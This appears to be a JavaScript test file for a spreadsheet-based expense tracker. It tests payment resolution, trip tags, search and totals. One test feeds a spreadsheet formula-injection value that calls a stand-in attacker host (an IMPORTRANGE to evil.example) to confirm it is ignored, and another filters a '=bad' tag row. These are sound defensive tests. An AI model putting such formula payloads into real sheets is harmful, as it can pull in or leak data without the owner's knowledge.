const test = require('node:test');
const assert = require('node:assert/strict');
const schema = require('../src/Schema.js');
const parser = require('../src/Parser.js');
const match = require('../src/Match.js');

const payments = parser.paymentsFromRows(schema.EXAMPLE_PAYMENTS);

test('typed payment wins over a pinned chip, memory, and the default', () => {
  const chosen = match.resolvePayment({
    payments: payments,
    explicitCode: '現金',
    explicitSynthetic: false,
    pinned: true,
    hintCode: 'cube',
    rememberedCode: 'ef',
    defaultCode: 'cube'
  });
  assert.equal(chosen.code, '現金');
});

test('a pinned chip wins over memory when nothing was typed', () => {
  const chosen = match.resolvePayment({
    payments: payments,
    explicitCode: '',
    pinned: true,
    hintCode: 'ef',
    rememberedCode: '現金',
    defaultCode: 'cube'
  });
  assert.equal(chosen.code, 'ef');
});

test('memory wins when the chip was not pinned', () => {
  const chosen = match.resolvePayment({
    payments: payments,
    explicitCode: '',
    pinned: false,
    hintCode: 'cube',
    rememberedCode: '現金',
    defaultCode: 'cube'
  });
  assert.equal(chosen.code, '現金');
});

test('unknown pinned codes are ignored', () => {
  const chosen = match.resolvePayment({
    payments: payments,
    explicitCode: '',
    pinned: true,
    hintCode: '=IMPORTRANGE("https://evil.example","A1")',
    rememberedCode: '',
    defaultCode: 'cube'
  });
  assert.equal(chosen.code, 'cube');
});

test('a bank-prefixed transfer becomes its own linkable code', () => {
  const chosen = match.resolvePayment({
    payments: payments,
    explicitCode: '甲銀行轉帳',
    explicitSynthetic: true,
    pinned: true,
    hintCode: 'cube',
    defaultCode: 'cube'
  });
  assert.equal(chosen.code, '甲銀行轉帳');
  assert.equal(chosen.accountCode, '甲銀行');
  assert.equal(chosen.type, '轉帳');
});

test('tags match inclusive ranges and merge with an explicit tag', () => {
  const tags = [
    { name: '範例旅行', start: '2026-02-15', end: '2026-02-22' },
    { name: '另一段', start: '2026-02-22', end: '2026-02-22' }
  ];
  assert.deepEqual(match.tagsForDate('2026-02-15', tags), ['範例旅行']);
  assert.deepEqual(match.tagsForDate('2026-02-22', tags), ['範例旅行', '另一段']);
  assert.deepEqual(match.tagsForDate('2026-02-23', tags), []);
  assert.equal(match.mergeTagNames('手標', ['範例旅行', '手標']), '手標、範例旅行');
});

test('search covers name, category, and tag across the list it is given', () => {
  const entries = [
    { name: '早餐', category: '吃', tag: '範例旅行', note: '', paymentName: '現金', paymentCode: '現金', currency: 'TWD' },
    { name: 'ChatGPT', category: 'AI工具', tag: '', note: '範例', paymentName: '範例信用卡 Cube', paymentCode: 'cube', currency: 'USD' }
  ];
  assert.equal(match.searchEntryList(entries, 'chatgpt').length, 1);
  assert.equal(match.searchEntryList(entries, '吃').length, 1);
  assert.equal(match.searchEntryList(entries, '範例旅行').length, 1);
  assert.equal(match.searchEntryList(entries, '').length, 0);
});

test('explicit lookup does not fall through to the default card', () => {
  assert.equal(match.resolvePayment({
    payments: payments,
    explicitCode: '不存在',
    explicitOnly: true,
    defaultCode: 'cube'
  }), null);
});

test('tag rows and entry rows coerce sheet values', () => {
  const tags = match.tagsFromRows([
    ['範例旅行', '2026-02-15', '2026/02/22', '假資料'],
    ['=bad', '2026-02-15', '2026-02-16', '']
  ]);
  assert.equal(tags.length, 1);
  assert.equal(tags[0].end, '2026-02-22');
  const entries = match.entriesFromRows([
    ['2026-01-01', '早餐（範例）', 80, 'TWD', '', '吃', '現金', '現金', '', '', '範例旅行', '', '早餐（範例）']
  ]);
  assert.equal(entries[0].twd, 80);
  assert.equal(entries[0].tag, '範例旅行');
});

test('tag totals sum estimated TWD only', () => {
  const summary = match.summarizeTag('範例旅行', [
    { tag: '範例旅行', twd: 80 },
    { tag: '範例旅行、其他', twd: 20 },
    { tag: '其他', twd: 999 },
    { tag: '範例旅行', twd: null }
  ]);
  assert.equal(summary.total, 100);
  assert.equal(summary.counted, 2);
  assert.equal(summary.entries.length, 3);
});
